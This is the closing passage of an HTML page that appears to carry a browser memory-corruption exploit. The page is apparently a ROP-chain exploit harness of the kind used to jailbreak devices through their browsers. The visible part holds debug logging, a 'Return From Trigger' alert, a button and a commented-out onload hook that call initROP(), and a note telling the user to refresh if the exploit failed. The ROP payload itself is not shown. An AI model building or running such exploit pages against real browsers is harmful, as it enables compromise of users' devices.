		dbg("...............M..A..G..I..C                    ");
		dbg("...............M..A..G..I..C....................");
		dbg("                                                ");
		dbg("                                                ");
		dbg("Return From Trigger ;)                          ");
		dbg("                                                ");
		
		
		// Alert on return from trigger
		alert("Return From Trigger ;)");
		
		return;
	} catch(e) {
		dbg(e);
	}
}
</script>
</head>
<!--<body id="BodyID" onload="initROP();">-->
<body id="BodyID";">
		<button onclick="initROP();">Beep Test</button> 
		<!--If this message appears without further log below, refresh the page because the exploit failed!<br>-->
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html>
